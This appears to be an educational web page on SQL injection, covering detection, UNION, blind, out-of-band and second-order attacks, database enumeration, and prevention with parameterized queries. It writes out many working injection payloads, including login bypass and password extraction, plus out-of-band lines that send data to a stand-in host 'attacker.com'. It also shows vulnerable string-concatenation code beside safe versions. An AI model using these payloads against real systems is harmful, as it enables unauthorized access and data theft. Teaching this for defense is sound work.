How SQL Injection Works

SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries an application makes to its database. It has been the #1 web vulnerability for over two decades and can result in unauthorized data access, authentication bypass, data destruction, and full server compromise.

Authentication bypass
📄
Confidential data exposure
🗑️
Data modification / deletion
💻
Server / infrastructure compromise

1. How to Detect SQL Injection

SQL injection can be detected manually using a systematic set of tests submitted to every input parameter. You can also use automated tools like Burp Scanner to find injectable parameters quickly.

Technique Payload What you're looking for
Single quote ' Syntax error / 500 response — confirms the input reaches SQL
Boolean conditions OR 1=1 / OR 1=2 Different responses for true vs false conditions
Time delay '; SLEEP(5)-- Response takes 5+ seconds — confirms blind injection
Comment sequences -- / # / /**/ Response changes when part of query is commented out
OAST payload '; exec xp_dirtree '//attacker.com'-- Out-of-band DNS/HTTP callback from the database server

2. Where SQL Injection Can Occur

Most SQL injection vulnerabilities occur in the WHERE clause of a SELECT query. But they can appear anywhere user input reaches SQL:

WHERE clause UPDATE values INSERT values SELECT table/column name ORDER BY clause

Click each type to expand the full explanation and payloads.

👁️ Retrieving Hidden Data APPRENTICE ▶

A shopping application displays products by category using this query:

SELECT * FROM products WHERE category='Gifts' AND released=1

The released=1 condition hides unreleased items from users. An attacker can inject into the URL:

https://example.com/products?category=Gifts'--

Resulting SQL:
SELECT * FROM products WHERE category='Gifts'-- AND released=1

The -- comment removes the released=1 restriction. To expose every product across all categories:

?category=Gifts' OR 1=1--

SELECT * FROM products WHERE category='Gifts' OR 1=1-- AND released=1
↑ always true → returns ALL rows from the table

🔑 Subverting Application Logic (Login Bypass) APPRENTICE ▶

Login pages typically check credentials with a query like this:

SELECT * FROM users WHERE username='administrator' AND password='secret'

An attacker submits username administrator'-- with any password:

SELECT * FROM users WHERE username='administrator'-- AND password='x'
                                              └─ password check is gone!

The -- comments out the AND password=... portion entirely. The database returns the administrator row, and the application logs them in.

Alternative: OR 1=1

username: ' or 1=1--    (space after --)

SELECT * FROM users WHERE username='' OR 1=1-- AND password='x'
Returns ALL users — app logs in as the first row (usually admin)
Try this in Lab 1 — Login Bypass on the demo page.
📦 UNION Attacks — Extracting Data from Other Tables PRACTITIONER ▶

When an application returns query results in the response, an attacker can use UNION SELECT to retrieve data from entirely different tables — including usernames, passwords, and secrets.

-- Original query
SELECT name, description FROM products WHERE category='Gifts'

-- With UNION injection
SELECT name, description FROM products WHERE category='Gifts'
UNION SELECT username, password FROM users--

The original product rows are returned, followed by rows from the users table. The attacker sees both in the response.

Requirements for UNION to work:

Same number of columns Compatible data types per column

To find the number of columns, inject ORDER BY clauses until an error occurs:

' ORDER BY 1--   (no error)
' ORDER BY 2--   (no error)
' ORDER BY 3--   (error → only 2 columns!)

Then use NULLs to probe which columns accept string data:
' UNION SELECT NULL,NULL--
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--
🧭 Blind SQLi — Boolean Based PRACTITIONER ▶

Many applications don't return query results or error messages in the response. However, they may still behave differently depending on whether the injected condition is true or false. This is blind SQL injection.

-- Suppose a cookie-based tracking query:
SELECT trackingId FROM tracking WHERE id='abc123'

-- Inject a true condition → page shows "Welcome back!"
Cookie: id=abc123' AND 1=1--

-- Inject a false condition → "Welcome back!" disappears
Cookie: id=abc123' AND 1=2--

By changing conditions, the attacker can ask yes/no questions about the database — inferring data one character at a time:

-- "Is the first character of the admin password 'a'?"
' AND SUBSTRING((
  SELECT password FROM users WHERE username='administrator'
),1,1)='a'--

If the page behaves as if the condition is true, the first character is a. Automated tools like Burp Intruder cycle through all characters efficiently.

⏱️ Blind SQLi — Time Based PRACTITIONER ▶

When the application gives no observable difference in response regardless of whether the condition is true or false, an attacker can trigger deliberate time delays. If the response is slow, the condition was true.

-- MySQL / MariaDB
' AND SLEEP(5)--                         (5s delay = injectable)

-- Microsoft SQL Server
'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--

-- Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)--

Combine with conditional logic to extract data:

-- "Is the first char of admin password 's'? If so, delay 5 seconds."
' AND IF(SUBSTRING(password,1,1)='s', SLEEP(5), 0)--
📡 Out-of-Band (OAST) Injection PRACTITIONER ▶

Out-of-band techniques trigger a network interaction (DNS or HTTP) from the database server to an attacker-controlled host. This works when the app doesn't return results and time delays are unreliable (e.g. async queries).

-- Microsoft SQL Server: DNS lookup with data in subdomain
'; exec master..xp_dirtree '//attacker.com/a'--

-- Oracle: HTTP request via UTL_HTTP
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||password)
  FROM users WHERE username='administrator'--

The attacker monitors a DNS/HTTP server (e.g. Burp Collaborator) for incoming requests containing exfiltrated data.

💾 Second-Order (Stored) SQL Injection PRACTITIONER ▶

In first-order SQLi, the payload is immediately executed. In second-order injection, the malicious input is safely stored in the database on the first request — then retrieved and processed unsafely later.

-- Step 1: Register a username with a payload (stored safely)
username: admin'--
→ Parameterized INSERT, stored verbatim in users table

-- Step 2: Later, when the app changes their password:
UPDATE users SET password='newpass'
WHERE username='admin'-- '
→ Password check is bypassed — admin password is changed!

These are subtle and hard to detect because the injection point and the execution point are in completely different parts of the codebase.

🧩 SQLi in Other Contexts — XML, JSON, Headers PRACTITIONER ▶

SQL injection can occur anywhere user-controlled data reaches a SQL query — not just HTML form fields. This includes HTTP headers, cookies, JSON bodies, and XML inputs.

XML injection with encoding bypass

<!-- WAFs often block SQL keywords in requests -->
<storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>

&#x53; is the HTML entity for 'S' — decodes to SELECT after WAF inspection

Cookie injection

Cookie: trackingId=abc' AND 1=1--
Cookie: trackingId=abc' AND 1=2--

JSON body

POST /api/search
{"category": "Gifts' OR 1=1--"}

4. Examining the Database

After confirming injection, attackers enumerate the database to understand its structure and extract valuable data.

Version Fingerprinting
-- MySQL / MariaDB
SELECT @@version

-- Microsoft SQL Server
SELECT @@version

-- PostgreSQL
SELECT version()

-- Oracle
SELECT * FROM v$version
Table Enumeration
-- Most databases (not Oracle)
SELECT table_name FROM
  information_schema.tables

-- Oracle
SELECT table_name FROM all_tables

-- List columns in a table
SELECT column_name FROM
  information_schema.columns
  WHERE table_name='users'

5. Prevention — Parameterized Queries

The most effective defense is to use parameterized queries (prepared statements). The query structure is defined first as a hard-coded template — user input is never concatenated into it. The database receives input and SQL structure separately.

💀 Vulnerable — Java (JDBC)
String query = "SELECT * FROM products"
  + " WHERE category = '" + input + "'";
Statement statement = connection.createStatement();
ResultSet rs = statement.executeQuery(query);
// input goes directly into the SQL string
✅ Safe — Java (PreparedStatement)
PreparedStatement stmt = connection.prepareStatement(
  "SELECT * FROM products WHERE category = ?"
);
stmt.setString(1, input);
ResultSet rs = stmt.executeQuery();
// input is data only — can never change structure
💀 Vulnerable — Python
cursor.execute(
  "SELECT * FROM users WHERE name='" + name + "'"
)
✅ Safe — Python
cursor.execute(
  "SELECT * FROM users WHERE name = %s",
  (name,)
)
Important limitation: Parameterized queries cannot be used for table names, column names, or ORDER BY values (these are structural, not data). For these, use an allowlist of permitted values.
Golden rule: Query structure must be a hard-coded constant. No part of the SQL template should ever come from user input of any kind.
